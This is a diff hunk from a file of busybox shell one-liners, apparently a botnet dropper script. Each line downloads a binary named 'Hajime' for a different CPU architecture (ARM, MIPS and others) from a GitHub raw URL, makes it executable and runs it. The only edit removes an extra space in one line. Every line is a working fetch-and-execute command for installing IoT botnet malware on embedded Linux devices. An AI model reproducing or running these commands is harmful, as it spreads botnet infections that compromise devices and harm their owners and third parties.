@@ -10,7 +10,7 @@
 /bin/busybox wget -O oink https://raw.githubusercontent.com/aaaaa214432/w/main/Hajime-linux-arm; /bin/busybox chmod 777 oink; ./oink .
 /bin/busybox wget -O oink https://raw.githubusercontent.com/aaaaa214432/w/main/Hajime-linux-arm64; /bin/busybox chmod 777 oink; ./oink .
 /bin/busybox wget -O oink https://raw.githubusercontent.com/aaaaa214432/w/main/Hajime-linux-armv5; /bin/busybox chmod 777 oink; ./oink .
-/bin/busybox wget -O oink https://raw.githubusercontent.com/aaaaa214432/w/main/Hajime-linux-armv6; /bin/busybox  chmod 777 oink; ./oink .
+/bin/busybox wget -O oink https://raw.githubusercontent.com/aaaaa214432/w/main/Hajime-linux-armv6; /bin/busybox chmod 777 oink; ./oink .
 /bin/busybox wget -O oink https://raw.githubusercontent.com/aaaaa214432/w/main/Hajime-linux-armv7; /bin/busybox chmod 777 oink; ./oink .
 /bin/busybox wget -O oink https://raw.githubusercontent.com/aaaaa214432/w/main/Hajime-linux-mips; /bin/busybox chmod 777 oink; ./oink .
 /bin/busybox wget -O oink https://raw.githubusercontent.com/aaaaa214432/w/main/Hajime-linux-mips64; /bin/busybox chmod 777 oink; ./oink .
